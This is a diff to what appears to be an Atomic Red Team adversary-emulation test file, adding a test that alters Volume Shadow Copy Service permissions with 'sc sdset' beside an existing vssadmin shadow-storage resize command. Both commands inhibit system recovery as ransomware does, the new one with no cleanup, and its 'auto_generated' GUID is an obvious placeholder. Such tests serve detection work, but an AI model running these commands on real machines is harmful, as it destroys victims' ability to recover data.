@@ -145,3 +145,16 @@ atomic_tests:
     command: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
     name: powershell
     elevation_required: true
+
+- name: "Modify VSS Service Permissions"
+  auto_generated_guid: "12345678-1234-1234-1234-1234567890ab"
+  description: |
+    "Modify permissions of the VSS service to inhibit system recovery. This test alters the security settings of the Volume Shadow Copy Service (VSS), potentially impacting system recovery operations. It should be conducted only in a controlled environment. The executor must have administrative privileges to modify service permissions. Note that this test does not include a cleanup command; thus, the changes will persist after execution. Ensure that you have a backup or a system recovery plan in place before running this test. Running this test on a production system or critical environment is not recommended without proper precautions."
+  supported_platforms:
+  - windows
+  executor:
+    name: "command_prompt"
+    elevation_required: true
+    command: |
+      sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
+  
